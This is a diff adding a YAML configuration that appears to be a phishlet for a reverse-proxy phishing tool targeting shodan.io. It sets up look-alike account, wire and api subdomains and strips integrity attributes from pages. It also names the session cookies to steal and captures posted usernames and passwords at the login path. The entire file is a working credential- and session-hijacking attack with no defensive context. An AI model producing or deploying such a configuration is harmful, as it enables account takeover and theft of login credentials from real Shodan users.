@@ -1,0 +1,31 @@
+author: '@me'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'shodan.io', session: true, is_landing: true}
+  - {phish_sub: 'wire', orig_sub: 'wire', domain: 'shodan.io', session: true, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'shodan.io', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'account.shodan.io', orig_sub: 'account', domain: 'shodan.io', search: 'integrity="(.*?)"', replace: '',  mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.shodan.io'
+    keys: ['polito']
+  - domain: 'account.shodan.io'
+    keys: ['session', 'polito']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'account.shodan.io'
+  path: '/login'
+
